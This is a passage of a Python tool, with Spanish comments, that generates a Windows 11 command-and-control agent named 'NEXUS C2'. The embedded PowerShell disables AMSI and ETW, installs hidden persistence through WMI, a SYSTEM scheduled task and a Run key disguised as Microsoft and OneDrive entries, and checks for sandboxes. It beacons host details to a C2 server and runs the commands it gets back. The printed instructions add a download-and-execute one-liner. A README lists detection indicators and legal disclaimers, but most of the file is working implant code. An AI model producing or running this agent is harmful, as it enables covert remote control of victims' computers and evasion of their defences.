        powershell_code = f'''# PowerShell Agent Enhanced - Windows 11 Bypass
# Autor: Security Research
# Uso: Solo para pruebas autorizadas

# ============================================================================
# CONFIGURACIÓN
# ============================================================================
$C2_SERVER = "{c2_server}"
$C2_PORT = {c2_port}
$SESSION_ID = "{session_id}"
$BEACON_INTERVAL = 45

# ============================================================================
# BYPASS AMSI (Múltiples métodos)
# ============================================================================

function Bypass-AMSI-Comprehensive {{
    # Método 1: Memory patch (si tenemos permisos)
    try {{
        $Win32 = Add-Type -MemberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "Win32" -Namespace Win32Functions -PassThru
        
        $amsiDll = $Win32::LoadLibrary("amsi.dll")
        $asbAddr = $Win32::GetProcAddress($amsiDll, "AmsiScanBuffer")
        
        if ($asbAddr -ne [IntPtr]::Zero) {{
            Write-Host "[+] AMSI patch address: $asbAddr" -ForegroundColor Green
        }}
    }} catch {{}}

    # Método 2: Reflection
    try {{
        $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($Ref) {{
            $Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
            Write-Host "[+] AMSI disabled via reflection" -ForegroundColor Green
        }}
    }} catch {{}}

    # Método 3: Forzar error de contexto
    try {{
        [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',('NonPublic,Static')) -as [Reflection.FieldInfo]).SetValue($null,$true)
    }} catch {{}}
}}

# ============================================================================
# BYPASS ETW
# ============================================================================

function Bypass-ETW {{
    try {{
        # Método 1: Patch via .NET Reflection
        $etwProvider = [System.Diagnostics.Eventing.EventProvider].GetField("m_provider", "NonPublic,Instance")
        if ($etwProvider) {{
            # Intentar deshabilitar
        }}
        
        # Método 2: Usar scripts nativos
        $script = @'
using System;
using System.Runtime.InteropServices;
public class EtwBypass {{
    [DllImport("ntdll.dll")]
    public static extern uint NtSetInformationProcess(IntPtr hProcess, uint processInformationClass, ref uint processInformation, uint processInformationLength);
    
    public static void Disable() {{
        uint flag = 0x1F;
        uint disable = 1;
        NtSetInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, flag, ref disable, 4);
    }}
}}
'@
        
        Add-Type -TypeDefinition $script -Language CSharp
        [EtwBypass]::Disable()
        Write-Host "[+] ETW bypass applied" -ForegroundColor Green
    }} catch {{}}
}}

# ============================================================================
# PERSISTENCIA AVANZADA
# ============================================================================

function Install-Persistence-Advanced {{
    param(
        [string]$PayloadPath = $MyInvocation.MyCommand.Path
    )
    
    # Método 1: WMI Event Subscription
    try {{
        $filterName = "WindowsUpdateMonitor_" + (Get-Random -Minimum 1000 -Maximum 9999)
        $consumerName = "WindowsUpdateService_" + (Get-Random -Minimum 1000 -Maximum 9999)
        
        $filterArgs = @{{
            Name = $filterName
            EventNamespace = 'root\cimv2'
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        }}
        
        $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs
        
        $consumerArgs = @{{
            Name = $consumerName
            CommandLineTemplate = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '$PayloadPath'"
        }}
        
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs
        
        $bindingArgs = @{{
            Filter = $filter
            Consumer = $consumer
        }}
        
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs
        
        Write-Host "[+] WMI persistence installed: $filterName" -ForegroundColor Green
    }} catch {{ Write-Host "[-] WMI persistence failed" -ForegroundColor Red }}
    
    # Método 2: Scheduled Task
    try {{
        $taskName = "MicrosoftEdgeUpdate_" + (Get-Random -Minimum 1000 -Maximum 9999)
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File '$PayloadPath'"
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
        
        Write-Host "[+] Scheduled Task installed: $taskName" -ForegroundColor Green
    }} catch {{ Write-Host "[-] Scheduled Task failed" -ForegroundColor Red }}
    
    # Método 3: Registry
    try {{
        $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        $valueName = "OneDriveSync_" + (Get-Random -Minimum 1000 -Maximum 9999)
        $regValue = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '$PayloadPath'"
        
        New-ItemProperty -Path $regPath -Name $valueName -Value $regValue -PropertyType String -Force
        
        Write-Host "[+] Registry persistence installed" -ForegroundColor Green
    }} catch {{ Write-Host "[-] Registry persistence failed" -ForegroundColor Red }}
}}

# ============================================================================
# OFUSCACIÓN Y EVASIÓN
# ============================================================================

function Invoke-ObfuscatedCommand {{
    param([string]$Command)
    
    # Dividir y ofuscar comando
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Command)
    $base64 = [Convert]::ToBase64String($bytes)
    
    # Crear comando ofuscado
    $chunks = @()
    for ($i = 0; $i -lt $base64.Length; $i += 4) {{
        $chunk = $base64.Substring($i, [Math]::Min(4, $base64.Length - $i))
        $chunks += "`"$chunk`""
    }}
    
    $chunkString = $chunks -join ","
    $obfuscated = "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($chunkString -join ''))) | IEX"
    
    return $obfuscated
}}

function Test-Evasion {{
    # Verificar si estamos en sandbox
    $isSandbox = $false
    
    # Check 1: Tiempo de ejecución del sistema
    $uptime = (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime
    $uptimeHours = ((Get-Date) - $uptime).TotalHours
    if ($uptimeHours -lt 2) {{ $isSandbox = $true }}
    
    # Check 2: Memoria RAM
    $ram = (Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    if ($ram -lt 2) {{ $isSandbox = $true }}
    
    # Check 3: CPU cores
    $cores = (Get-CimInstance -ClassName Win32_Processor).NumberOfCores
    if ($cores -lt 2) {{ $isSandbox = $true }}
    
    return $isSandbox
}}

# ============================================================================
# COMUNICACIÓN C2
# ============================================================================

function Connect-C2 {{
    param([string]$Data)
    
    try {{
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect($C2_SERVER, $C2_PORT)
        $stream = $tcpClient.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        
        $writer.WriteLine($Data)
        $writer.Flush()
        
        $response = $reader.ReadLine()
        
        $reader.Close()
        $writer.Close()
        $tcpClient.Close()
        
        return $response
    }} catch {{
        return $null
    }}
}}

function Send-Handshake {{
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    $arch = if ([Environment]::Is64BitOperatingSystem) {{ "x64" }} else {{ "x86" }}
    
    $handshake = @{{
        type = "agent_handshake"
        session_id = $SESSION_ID
        hostname = $hostname
        username = $username
        os = $os
        arch = $arch
        pid = $PID
        bypass_status = @{{
            amsi = $true
            etw = $true
            persistence = $true
        }}
        capabilities = @("shell", "file_transfer", "persistence_install")
    }} | ConvertTo-Json -Compress
    
    Connect-C2 -Data $handshake | Out-Null
}}

# ============================================================================
# MAIN EXECUTION
# ============================================================================

# Aplicar bypasses
Write-Host "[*] Applying Windows 11 bypasses..." -ForegroundColor Yellow
Bypass-AMSI-Comprehensive
Bypass-ETW

# Verificar sandbox
if (Test-Evasion) {{
    Write-Host "[!] Sandbox detected, exiting..." -ForegroundColor Red
    exit
}}

# Instalar persistencia (opcional)
if ($args -contains "--install") {{
    Install-Persistence-Advanced
}}

# Handshake inicial
Send-Handshake

# Loop principal
while ($true) {{
    try {{
        # Heartbeat
        $heartbeat = @{{type = "heartbeat"; session_id = $SESSION_ID}} | ConvertTo-Json -Compress
        $response = Connect-C2 -Data $heartbeat
        
        if ($response) {{
            $command = $response | ConvertFrom-Json
            
            if ($command.type -eq "execute_command") {{
                # Ejecutar comando ofuscado
                $obfuscatedCmd = Invoke-ObfuscatedCommand -Command $command.command
                $result = Invoke-Expression $obfuscatedCmd 2>&1 | Out-String
                
                $responseData = @{{
                    type = "command_result"
                    command_id = $command.command_id
                    result = $result
                    success = $?
                }} | ConvertTo-Json -Compress
                
                Connect-C2 -Data $responseData | Out-Null
            }}
            elseif ($command.type -eq "install_persistence") {{
                Install-Persistence-Advanced
                $responseData = @{{type = "result"; message = "Persistence installed"}} | ConvertTo-Json -Compress
                Connect-C2 -Data $responseData | Out-Null
            }}
        }}
    }} catch {{
        # Error silencioso
    }}
    
    Start-Sleep -Seconds $BEACON_INTERVAL
}}
'''
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(powershell_code)
        
        print(f"[+] PowerShell mejorado generado: {output_file}")
        
        # Mostrar instrucciones
        self._show_powershell_instructions(output_file)
        
        return output_file
    
    def _show_powershell_instructions(self, filename):
        """Mostrar instrucciones para PowerShell"""
        
        instructions = f'''
📋 INSTRUCCIONES PARA POWERSHELL MEJORADO:

1. EJECUCIÓN BÁSICA (bypass automático):
   powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File {filename}

2. CON PERSISTENCIA:
   powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File {filename} --install

3. COMO ONELINER (sin archivo):
   IEX(New-Object Net.WebClient).DownloadString('http://your-server/{filename}')

4. MÉTODOS DE BYPASS INCLUIDOS:
   • AMSI Bypass (3 métodos diferentes)
   • ETW Bypass (Event Tracing for Windows)
   • Persistencia avanzada (WMI, Scheduled Tasks, Registry)
   • Detección de sandbox
   • Ofuscación de comandos

5. COMANDOS C2 DISPONIBLES:
   • execute_command <cmd>     - Ejecutar comando ofuscado
   • install_persistence       - Instalar persistencia
   • heartbeat                 - Enviar latido

6. PARA DETECCIÓN BLUE TEAM:
   • Monitorear WMI Event Subscriptions
   • Verificar Scheduled Tasks con nombres aleatorios
   • Buscar procesos PowerShell con argumentos ofuscados
   • Monitorizar conexiones al puerto {self.c2_port}

⚠️  SOLO PARA ENTORNOS AUTORIZADOS
'''
        
        print(instructions)
    
    def generate_all_agents(self, c2_server, c2_port, output_dir="agents_enhanced"):
        """Generar todos los tipos de agentes mejorados"""
        
        os.makedirs(output_dir, exist_ok=True)
        
        print(f"[+] Generando agentes mejorados en: {output_dir}")
        
        # 1. Agente C# mejorado
        cs_file = os.path.join(output_dir, "agent_enhanced.cs")
        self.generate_enhanced_csharp(c2_server, c2_port, cs_file)
        
        # 2. PowerShell mejorado
        ps_file = os.path.join(output_dir, "agent_enhanced.ps1")
        self.generate_powershell_enhanced(c2_server, c2_port, ps_file)
        
        # 3. Generar README
        self._generate_readme(c2_server, c2_port, output_dir)
        
        print(f"\n[+] Todos los agentes generados en: {output_dir}")
        print(f"    • agent_enhanced.cs   - Agente C# con bypass completo")
        print(f"    • agent_enhanced.ps1  - PowerShell mejorado")
        print(f"    • compile_enhanced.bat - Script de compilación")
        print(f"    • README.txt          - Instrucciones completas")
    
    def _generate_readme(self, c2_server, c2_port, output_dir):
        """Generar archivo README"""
        
        readme = f'''NEXUS C2 - AGENTES MEJORADOS WINDOWS 11
============================================

ESTE SOFTWARE ES EXCLUSIVAMENTE PARA:
• Investigación de seguridad autorizada
• Pruebas de penetración con permiso
• Laboratorios CTF controlados
• Auditorías de seguridad

⚠️ NUNCA USAR EN SISTEMAS NO AUTORIZADOS

CONFIGURACIÓN
-------------
Servidor C2: {c2_server}
Puerto C2: {c2_port}

AGENTES GENERADOS
-----------------

1. agent_enhanced.cs
   - Lenguaje: C#
   - Características:
     • AMSI Bypass (Windows 11 compatible)
     • ETW Bypass completo
     • Persistencia avanzada (WMI, Scheduled Tasks)
     • Ofuscación real-time
     • SmartScreen bypass
     • Anti-debugging mejorado
   
   Compilación:
     compile_enhanced.bat
   
   Uso:
     agent_enhanced.exe          - Ejecutar agente
     agent_enhanced.exe --install - Instalar persistencia

2. agent_enhanced.ps1
   - Lenguaje: PowerShell
   - Características:
     • AMSI Bypass (3 métodos)
     • ETW Bypass
     • Persistencia múltiple
     • Detección de sandbox
     • Ofuscación de comandos
   
   Uso:
     powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File agent_enhanced.ps1
     powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File agent_enhanced.ps1 --install

TÉCNICAS DE BYPASS IMPLEMENTADAS
--------------------------------

1. AMSI BYPASS:
   • Patch de memoria AmsiScanBuffer
   • Reflection para deshabilitar AMSI
   • Context manipulation

2. ETW BYPASS:
   • NtSetInformationProcess
   • Patch EtwEventWrite
   • Deshabilitar providers .NET

3. PERSISTENCIA:
   • WMI Event Subscriptions
   • Scheduled Tasks disfrazados
   • Registry Run keys
   • Startup folder

4. EVASIÓN:
   • Ofuscación real-time
   • Detección de sandbox
   • Anti-debugging
   • Cambio de nombres

DETECCIÓN DEFENSIVA (Blue Team)
--------------------------------

Indicadores de Compromiso (IOCs):

1. Red:
   • Conexiones a {c2_server}:{c2_port}
   • Beaconing cada 45 segundos
   • Tráfico JSON con campos específicos

2. Sistema:
   • WMI Event Filters con nombres aleatorios
   • Scheduled Tasks con nombres de Microsoft
   • Procesos con argumentos ofuscados
   • Modificación de checksum PE

3. PowerShell:
   • Scripts con funciones de bypass
   • Comandos ofuscados en base64
   • Deshabilitación de AMSI/ETW

MITIGACIONES RECOMENDADAS
--------------------------

1. Endpoint:
   • Habilitar AMSI y asegurar funcionamiento
   • Usar EDR con behavioral analysis
   • Monitorizar WMI y Scheduled Tasks
   • PowerShell logging completo

2. Network:
   • Inspección SSL/TLS
   • IDS/IPS con firmas C2
   • Monitoreo de beaconing
   • Filtrado egress

3. Logging:
   • Sysmon con configuración completa
   • Windows Event Log centralizado
   • PowerShell transcription

LEGALIDAD
---------

Este software debe usarse SOLO en:
• Sistemas propios con permiso
• Laboratorios de pruebas controlados
• Ejercicios de capacitación autorizados
• Auditorías de seguridad contratadas

El uso no autorizado es ILEGAL y puede resultar en:
• Procesamiento penal
• Sanciones civiles
• Pérdida de certificaciones
• Daño a la reputación

CONTACTO Y SOPORTE
-------------------

Este es software de investigación.
No hay soporte para uso malicioso.

Para preguntas de investigación:
research@security-lab.edu

Última actualización: {datetime.now().strftime('%Y-%m-%d')}
'''
        
        readme_file = os.path.join(output_dir, "README.txt")
        with open(readme_file, 'w', encoding='utf-8') as f:
            f.write(readme)
        
        print(f"[+] README generado: {readme_file}")

def main():
    """Función principal mejorada"""
    
    print("""
╔══════════════════════════════════════════════════════════════════╗
║      GENERADOR DE AGENTES WINDOWS 11 - BYPASS COMPLETO          ║
║            AMSI + ETW + PERSISTENCIA + OFUSCACIÓN               ║
╚══════════════════════════════════════════════════════════════════╝

⚠️  EXCLUSIVO PARA INVESTIGACIÓN AUTORIZADA Y LABORATORIOS CTF
    """)
    
    parser = argparse.ArgumentParser(description='Generador de agentes Windows 11 con bypass completo')
    parser.add_argument('--c2-server', required=True, help='IP del servidor C2')
    parser.add_argument('--c2-port', type=int, default=8443, help='Puerto del C2')
    parser.add_argument('--type', choices=['csharp', 'powershell', 'all'], 
                       default='all', help='Tipo de agente')
    parser.add_argument('--output', help='Nombre del archivo de salida')
    parser.add_argument('--features', nargs='+', 
                       default=['amsi', 'etw', 'persistence', 'obfuscation'],
                       help='Características a incluir (amsi, etw, persistence, obfuscation, smartscreen)')
    
    args = parser.parse_args()
    
    generator = SilentWindowsAgentEnhanced()
    
    if args.type == 'csharp':
        if not args.output:
            args.output = "agent_enhanced.exe"
        
        generator.generate_enhanced_csharp(
            args.c2_server, 
            args.c2_port, 
            args.output,
            args.features
        )
    
    elif args.type == 'powershell':
        if not args.output:
            args.output = "agent_enhanced.ps1"
        
        generator.generate_powershell_enhanced(
            args.c2_server, 
            args.c2_port, 
            args.output
        )
    
    elif args.type == 'all':
        generator.generate_all_agents(
            args.c2_server, 
            args.c2_port
        )
    
    print(f"\n✅ Generación completada")
    print(f"   Servidor C2: {args.c2_server}:{args.c2_port}")
    print(f"   Recordatorio: USO ÉTICO Y AUTORIZADO ÚNICAMENTE")

if __name__ == "__main__":
    main()
